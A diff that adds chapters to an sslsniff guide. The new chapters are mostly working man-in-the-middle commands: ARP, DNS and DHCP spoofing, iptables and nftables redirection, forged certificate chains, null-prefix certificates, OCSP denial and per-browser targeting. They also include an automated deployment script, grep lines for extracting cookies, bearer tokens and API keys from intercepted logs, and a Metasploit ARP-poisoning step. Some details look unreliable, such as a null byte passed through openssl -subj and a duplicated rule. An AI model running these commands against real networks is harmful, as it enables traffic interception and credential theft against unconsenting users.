@@ -394,6 +394,283 @@ openssl verify -CAfile ca.crt generated.crt
 
 ---
 
+## Chapter 9: Network Positioning Techniques
+
+### ARP Spoofing
+
+```bash
+# Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Spoof ARP replies to redirect traffic
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
+
+# Verify ARP cache poisoning
+arp -n | grep 192.168.1.100
+```
+
+### DNS Spoofing
+
+```bash
+# Using dnschef for DNS redirection
+sudo python3 dnschef.py --fakeip 10.0.0.5 --fake domains=facebook.com,twitter.com
+
+# Using dnsmasq for DNS spoofing
+echo "address=/#/10.0.0.5" > /tmp/dnsmasq_spoof.conf
+sudo dnsmasq -C /tmp/dnsmasq_spoof.conf --no-daemon
+
+# Combined with sslsniff
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
+sslsniff -a -c ca.crt -s 443 -w intercepted.log
+```
+
+### DHCP Spoofing
+
+```bash
+# Using Yersinia for DHCP attacks
+sudo yersinia dhcp -attack 1 -interface eth0
+
+# Rogue DHCP assigning attacker as gateway
+# Traffic flows through attacker for interception
+```
+
+### iptables Traffic Redirection
+
+```bash
+# Redirect HTTPS traffic to sslsniff
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
+  -j REDIRECT --to-port 8443
+
+# Redirect all outbound HTTPS (requires routing control)
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
+  -j REDIRECT --to-ports 8443
+
+# Redirect specific subnet
+sudo iptables -t nat -A PREROUTING -s 192.168.1.0/24 -p tcp \
+  --dport 443 -j REDIRECT --to-ports 8443
+
+# Clean up rules
+sudo iptables -t nat -D PREROUTING -i eth0 -p tcp --dport 443 \
+  -j REDIRECT --to-port 8443
+```
+
+### nftables Rules
+
+```bash
+# Modern nftables equivalent
+sudo nft add table nat
+sudo nft add chain nat prerouting { type nat hook prerouting priority 0 \; }
+sudo nft add rule nat prerouting iif eth0 tcp dport 443 redirect to :8443
+
+# With IP address filtering
+sudo nft add rule nat prerouting iif eth0 ip saddr 192.168.1.0/24 \
+  tcp dport 443 redirect to :8443
+```
+
+---
+
+## Chapter 10: Certificate Attack Deep Dive
+
+### Null-Prefix Certificate Attack
+
+The null-prefix attack exploits a vulnerability where a null byte (\x00) in the Common Name (CN) field of a certificate causes some parsers to truncate the name at that point:
+
+```
+CN=www.good.com\x00www.evil.com
+```
+
+Certain older browsers or certificate validators might parse this as `www.good.com` while the actual certificate was issued for `www.evil.com`.
+
+```bash
+# Generate a certificate with null prefix (requires vulnerable CA)
+# This attack is largely mitigated in modern systems
+
+# Test if a system is vulnerable
+# Create a certificate with embedded null bytes
+openssl req -new -x509 -key attacker.key -out null_prefix.crt \
+  -subj "/CN=www.good.com\x00www.evil.com" -days 365
+
+# Install in sslsniff targeted mode
+mkdir -p /tmp/targeted_certs/
+cp null_prefix.crt /tmp/targeted_certs/
+cp attacker.key /tmp/targeted_certs/
+sslsniff -t /tmp/targeted_certs/ -s 443 -w null_prefix.log
+```
+
+### OCSP Attack Mechanics
+
+The OCSP denial attack works by intercepting and blocking Online Certificate Status Protocol requests, preventing browsers from checking whether a certificate has been revoked:
+
+```bash
+# sslsniff with OCSP denial
+sslsniff -a -c ca.crt -s 443 -d -w ocsp_attack.log
+
+# Monitor OCSP requests being blocked
+sudo tcpdump -i eth0 port 80 -w ocsp_requests.pcap
+
+# Analyze blocked OCSP requests
+tcpdump -r ocsp_requests.pcap -A | grep "OCSP"
+```
+
+**How OCSP denial works:**
+1. Browser connects to sslsniff
+2. sslsniff presents forged certificate
+3. Browser tries to check OCSP revocation status
+4. sslsniff blocks the OCSP request (returns connection refused or timeout)
+5. Browser falls back to "OCSP unknown" status
+6. Some browsers accept certificates when OCSP is unavailable
+
+### Certificate Chain Attacks
+
+```bash
+# Generate a full certificate chain
+# Root CA
+openssl genrsa -out rootCA.key 4096
+openssl req -new -x509 -key rootCA.key -out rootCA.crt -days 3650 \
+  -subj "/CN=Attacker Root CA"
+
+# Intermediate CA (signed by root)
+openssl genrsa -out intermediateCA.key 2048
+openssl req -new -key intermediateCA.key -out intermediateCA.csr \
+  -subj "/CN=Attacker Intermediate CA"
+openssl x509 -req -in intermediateCA.csr -CA rootCA.crt -CAkey rootCA.key \
+  -CAcreateserial -out intermediateCA.crt -days 1825
+
+# Use chain with sslsniff
+sslsniff -a -c intermediateCA.crt -m rootCA.crt -s 443 -w chain_attack.log
+```
+
+### Browser-Specific Targeting Details
+
+```bash
+# Target Firefox specifically
+# Firefox uses its own certificate store, not the system store
+sslsniff -a -c ca.crt -s 443 -f ff -w firefox_only.log
+
+# Target Internet Explorer / Edge
+sslsniff -a -c ca.crt -s 443 -f ie -w ie_only.log
+
+# Target Safari (macOS)
+sslsniff -a -c ca.crt -s 443 -f safari -w safari_only.log
+
+# Target Opera
+sslsniff -a -c ca.crt -s 443 -f opera -w opera_only.log
+
+# Target iOS devices
+sslsniff -a -c ca.crt -s 443 -f ios -w ios_only.log
+
+# Combine browser filtering with HTTP fingerprinting
+sslsniff -a -c ca.crt -s 443 -h 8080 -f ff,ie -w multi_browser.log
+```
+
+**Browser detection mechanism:** sslsniff uses HTTP on a secondary port to fingerprint browsers via their User-Agent strings, then selectively intercepts connections from targeted browsers.
+
+---
+
+## Chapter 11: Scripting and Automation
+
+### Automated Certificate Deployment
+
+```bash
+#!/bin/bash
+# auto_sslsniff.sh - Automated sslsniff deployment
+
+CA_KEY="/tmp/ca.key"
+CA_CERT="/tmp/ca.crt"
+LOG_DIR="/var/log/sslsniff"
+INTERFACE="eth0"
+LISTEN_PORT="443"
+
+# Generate CA if not exists
+if [ ! -f "$CA_KEY" ]; then
+    echo "[*] Generating CA certificate..."
+    openssl genrsa -out "$CA_KEY" 2048
+    openssl req -new -x509 -key "$CA_KEY" -out "$CA_CERT" -days 365 \
+        -subj "/CN=Security Assessment CA"
+fi
+
+# Create log directory
+mkdir -p "$LOG_DIR"
+
+# Start sslsniff
+echo "[*] Starting sslsniff on port $LISTEN_PORT..."
+sslsniff -a -c "$CA_CERT" -s "$LISTEN_PORT" \
+    -d \
+    -w "$LOG_DIR/intercept_$(date +%Y%m%d_%H%M%S).log" \
+    -p \
+    2>&1 | tee "$LOG_DIR/sslsplit_console.log"
+```
+
+### Output Parsing
+
+```bash
+# Extract POST requests from sslsniff output
+grep -B2 "POST" intercepted.log | grep -E "Host:|POST|Cookie"
+
+# Extract all visited URLs
+grep "Host:" intercepted.log | sort -u
+
+# Count connections per domain
+grep "Host:" intercepted.log | awk '{print $2}' | sort | uniq -c | sort -rn
+
+# Extract authentication headers
+grep -i "authorization\|x-api-key\|bearer" intercepted.log
+```
+
+### Integration with Metasploit
+
+```bash
+# Use sslsniff alongside Metasploit exploitation
+# 1. Set up network positioning
+msfconsole -q -x "use auxiliary/spoof/arp/arp_cache_poison; set HOSTS 192.168.1.0/24; run"
+
+# 2. Start sslsniff for credential capture
+sslsniff -a -c ca.crt -s 443 -p -w msf_creds.log &
+
+# 3. Exploit captured credentials
+```
+
+---
+
+## Chapter 12: SSL/TLS Protocol Analysis
+
+### Supported TLS Versions
+
+| Version | Status | sslsniff Support |
+|---------|--------|-----------------|
+| SSL 2.0 | Deprecated | Limited |
+| SSL 3.0 | Deprecated | Yes |
+| TLS 1.0 | Deprecated | Yes |
+| TLS 1.1 | Deprecated | Yes |
+| TLS 1.2 | Current | Yes |
+| TLS 1.3 | Current | Partial |
+
+### TLS 1.3 Considerations
+
+TLS 1.3 encrypts more of the handshake process, which limits some sslsniff attack vectors:
+
+```bash
+# Detect TLS 1.3 connections
+sslsniff -a -c ca.crt -s 443 -v -w tls13_debug.log 2>&1 | grep "TLS 1.3"
+
+# TLS 1.3 hides the Server Name in encrypted SNI (ESNI/eSNI)
+# sslsniff may not be able to determine the target domain
+```
+
+### Cipher Suite Negotiation Analysis
+
+```bash
+# Monitor cipher suite negotiation
+sslsniff -a -c ca.crt -s 443 -v -w cipher_analysis.log 2>&1 | grep -i "cipher"
+
+# Look for weak cipher suites
+sslsniff -a -c ca.crt -s 443 -v -w weak_cipher.log 2>&1 | \
+  grep -i "RC4\|DES\|NULL\|EXPORT\|anon\|MD5"
+```
+
+---
+
 ## Resources
 
 - **GitHub:** https://github.com/moxie0/sslsniff
@@ -401,3 +678,7 @@ openssl verify -CAfile ca.crt generated.crt
 - **Moxie Marlinspike Presentations:** https://www.blackhat.com/presentations.html
 - **SSL/TLS Security:** https://www.howsmyssl.com/
 - **Certificate Tools:** https://www.ssllabs.com/
+- **RFC 5246 (TLS 1.2):** https://tools.ietf.org/html/rfc5246
+- **RFC 8446 (TLS 1.3):** https://tools.ietf.org/html/rfc8446
+- **RFC 6960 (OCSP):** https://tools.ietf.org/html/rfc6960
+- **OWASP TLS Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cheat_Sheet.html
